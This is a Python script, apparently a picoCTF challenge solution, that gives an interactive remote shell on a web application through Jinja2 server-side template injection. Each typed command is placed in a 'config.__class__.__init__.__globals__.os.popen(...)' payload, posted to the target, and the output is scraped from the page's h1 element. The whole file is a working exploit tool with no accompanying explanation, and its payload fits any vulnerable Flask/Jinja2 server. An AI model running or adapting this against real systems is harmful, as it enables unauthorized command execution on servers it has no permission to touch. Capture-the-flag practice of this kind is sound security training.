import requests
import re

TARGET_URL = "http://rescued-float.picoctf.net:61261/"

while True:
    try:
        cmd = input("Shell> ")
        if cmd.strip().lower() in ["exit", "quit"]:
            break

        payload = (
            "{{ config.__class__.__init__.__globals__.os.popen('%s').read() }}"
            % cmd
        )

        data = {
            "content": f"++{payload}"
        }

        response = requests.post(TARGET_URL, data=data)

        # Ambil isi dari <h1>...</h1>
        match = re.search(r"<h1.*?>(.*?)</h1>", response.text, re.DOTALL)
        if match:
            output = match.group(1)
            output = output.replace("++", "").replace("<br>", "\n").strip()
            print(output)
        else:
            print("[!] Output not found.")

    except KeyboardInterrupt:
        break
    except Exception as e:
        print(f"[!] Error: {e}")